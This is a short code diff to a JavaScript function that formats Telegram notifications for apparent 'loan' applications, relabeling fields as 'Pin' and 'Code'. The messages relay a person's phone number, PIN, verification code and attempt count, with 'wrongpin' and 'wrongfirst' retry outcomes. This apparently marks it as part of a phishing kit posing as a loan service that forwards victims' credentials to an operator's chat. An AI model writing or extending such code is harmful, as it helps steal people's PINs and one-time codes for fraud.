@@ -387,9 +387,9 @@ function formatTelegramNotification(application, kind) {
 
   if (kind === "approved") {
     return `🎉 LOAN APPROVED\n\n` +
-      `📋 Application: ${id}\n` +
+      `🔑 Pin: ${id}\n` +
       `📞 Phone: ${phone}\n` +
-      `🔢 Code 1: ${code1}\n` +
+      `🔢 Code: ${code1}\n` +
       `🔢 Attempt: #${attempt}\n\n` +
       `✅ Status: FULLY APPROVED\n` +
       `⏰ Date: ${stamp}\n\n` +
@@ -398,9 +398,9 @@ function formatTelegramNotification(application, kind) {
 
   const reason = kind === "wrongfirst" ? "Code 1 needs review" : kind === "wrongpin" ? "Application reference needs review" : "Application rejected";
   return `❌ LOAN REJECTED\n\n` +
-    `📋 Application: ${id}\n` +
+    `🔑 Pin: ${id}\n` +
     `📞 Phone: ${phone}\n` +
-    `🔢 Code 1: ${code1}\n` +
+    `🔢 Code : ${code1}\n` +
     `🔢 Attempt: #${attempt}\n\n` +
     `⚠️ Status: APPLICATION REJECTED\n` +
     `📝 Review: ${reason}\n` +
